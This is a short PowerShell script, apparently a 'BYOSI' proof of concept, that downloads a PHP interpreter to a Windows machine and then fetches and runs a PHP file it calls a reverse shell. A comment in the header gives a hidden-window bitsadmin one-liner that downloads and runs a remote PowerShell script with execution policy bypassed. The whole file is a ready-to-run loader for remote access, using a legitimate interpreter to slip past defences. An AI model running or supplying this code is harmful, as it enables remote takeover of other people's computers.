<# 

 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. |
| |   ______     | || |  ____  ____  | || |     ____     | || |    _______   | || |     _____    | | | |   ______     | || |     ____     | || |     ______   | |
| |  |_   _ \    | || | |_  _||_  _| | || |   .'    `.   | || |   /  ___  |  | || |    |_   _|   | | | |  |_   __ \   | || |   .'    `.   | || |   .' ___  |  | |
| |    | |_) |   | || |   \ \  / /   | || |  /  .--.  \  | || |  |  (__ \_|  | || |      | |     | | | |    | |__) |  | || |  /  .--.  \  | || |  / .'   \_|  | |
| |    |  __'.   | || |    \ \/ /    | || |  | |    | |  | || |   '.___`-.   | || |      | |     | | | |    |  ___/   | || |  | |    | |  | || |  | |         | |
| |   _| |__) |  | || |    _|  |_    | || |  \  `--'  /  | || |  |`\____) |  | || |     _| |_    | | | |   _| |_      | || |  \  `--'  /  | || |  \ `.___.'\  | |
| |  |_______/   | || |   |______|   | || |   `.____.'   | || |  |_______.'  | || |    |_____|   | | | |  |_____|     | || |   `.____.'   | || |   `._____.'  | |
| |              | || |              | || |              | || |              | || |              | | | |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   '----------------'  '----------------'  '----------------' 

 bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/byostuff.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1

#>

# Download our php interpreter
wget https://windows.php.net/downloads/releases/php-8.0.30-nts-Win32-vs16-x86.zip -O C:\\Windows\\Temp\\php.zip

# Extract from c:\windows\temp\php.zip to c:\php (default path)
Expand-Archive -Path C:\\Windows\\Temp\\php.zip -DestinationPath C:\\php

# Download our reverse shell
wget https://raw.githubusercontent.com/fuzzlove/Bug-Bounty-Toolz/refs/heads/master/phpconnect.php -O C:\\php\\index.php

# Run php with required sockets extention for reverse shell
& "C:\\php\\php.exe" @('-d extension=sockets') @('C:\php\index.php')
